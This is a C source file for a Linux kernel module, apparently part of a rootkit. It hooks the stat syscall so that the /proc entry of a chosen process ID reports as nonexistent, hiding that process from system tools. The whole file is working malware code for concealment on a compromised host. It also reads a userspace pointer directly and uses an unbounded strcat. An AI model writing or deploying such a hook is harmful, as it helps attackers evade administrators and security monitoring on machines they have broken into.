#include <linux/kernel.h>
#include <linux/uaccess.h>
#include "hooking.h"
#include "hide_proc.h"

#define MAX_PATH 100
char proc_path[MAX_PATH] = "/proc/";

static t_syscall old_stat;
static asmlinkage long new_stat(const struct pt_regs *pt_regs);


int init_hide_proc(char *pid) {
	if (!pid) {
		printk(KERN_INFO "[-] No pid to hide given.\n");
		return 1;
	}
	strcat(proc_path, pid);
	old_stat = get_syscall(__NR_stat);
	add_hook((unsigned long) new_stat, __NR_stat);
	return 0;
}

static asmlinkage long new_stat(const struct pt_regs *pt_regs) {
	char *path;

	path = (char *) pt_regs->di;
	if (!strcmp(path, proc_path)) {
		return -2;
	}

	return old_stat(pt_regs);
}
